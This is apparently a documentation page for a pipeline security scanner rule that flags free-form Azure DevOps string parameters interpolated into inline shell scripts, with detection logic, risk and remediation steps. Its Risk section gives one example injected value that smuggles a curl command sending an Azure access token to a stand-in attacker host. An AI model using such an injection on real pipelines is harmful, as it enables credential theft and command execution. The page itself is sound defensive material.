# Parameter Interpolation into Shell

**Rule ID:** `parameter_interpolation_into_shell`
**Severity:** Medium
**Category:** Injection
**Tags:** security, injection, azure-devops

## Detection

The rule reads the graph's `parameters` map (populated by the ADO parser from top-level `parameters:` declarations) and selects every parameter that is "free-form":

- declared `type: string` (or with no `type:` field — ADO defaults to string), AND
- has no `values:` allowlist constraining caller input.

Then for every Step node carrying a non-empty `META_SCRIPT_BODY`, the rule looks for the literal substrings `${{ parameters.<name> }}` and `${{parameters.<name>}}` (with and without the spaces) inside the body. When at least one matches, the rule fires once per step, listing the matched parameter names in the message.

The ADO parser captures `META_SCRIPT_BODY` from inline `script:` / `bash:` / `pwsh:` / `inlineScript:` blocks. The rule does **not** match interpolations that land in task input strings (e.g. `commandOptions: '-var "x=${{ parameters.X }}"'`); only inline shell bodies are flagged. This is intentional — Terraform `-var` values are quoted by Terraform's own argument parser before reaching the shell.

## Risk

ADO parameters of `type: string` (the default) are pasted verbatim into the YAML before runtime, with no escaping. When the resulting text is then handed to a shell or PowerShell interpreter, anyone with the "queue build" permission can inject arbitrary commands by passing a malicious value:

```
appName: "x; curl https://attacker.example/exfil?token=$(az account get-access-token --query accessToken -o tsv)"
```

Once injected, the attacker's command runs with the same authority as the rest of the step — typically with whatever Azure RBAC the surrounding service connection grants, plus the implicit `System.AccessToken`. This is the ADO twin of the well-known GitHub Actions `script-injection` class (CVE-2023-49291 et al.).

A `values:` allowlist eliminates the class of attack: ADO rejects any input that isn't on the list before the YAML is rendered. A free-form string parameter has no such backstop.

The "queue build" permission is granted broadly in most ADO organisations, including to interns, contractors, and read-only auditors who can re-run a finished build. The blast radius is large and the audit trail is thin.

## Remediation

1. **Add a `values:` allowlist (preferred):**
   ```yaml
   parameters:
     - name: environment
       type: string
       values: [dev, qa, staging, prod]   # rule clears immediately
   ```

2. **If the value is genuinely free-form, pass it through `env:` instead of interpolating directly:**
   ```yaml
   - script: |
       echo "$APP_NAME"        # quoted by the shell, not by YAML emission
     env:
       APP_NAME: ${{ parameters.appName }}
   ```
   The shell's normal quoting rules apply once the value lands in `$APP_NAME`, so a malicious value can't break out.

3. **Constrain the type:**
   - Names that are always identifiers? Use `type: object` and validate at the top of the script.
   - Numeric? Use `type: number` (ADO rejects non-numeric input).
   - Boolean? Use `type: boolean`.

4. **Verify:** Re-run `taudit scan --platform azure-devops`. The rule clears when the parameter declares a `values:` allowlist, or when the script no longer interpolates a free-form parameter directly.

## See also

- [self_mutating_pipeline](self_mutating_pipeline.md) — related script-side primitive (`##vso[task.setvariable]`)
- [trigger_context_mismatch](trigger_context_mismatch.md) — similar boundary (untrusted input meets privileged context)
- [Microsoft Learn — Runtime parameters](https://learn.microsoft.com/azure/devops/pipelines/process/runtime-parameters)
- [GitHub Security Lab — Script injection in GitHub Actions](https://securitylab.github.com/research/github-actions-untrusted-input/)
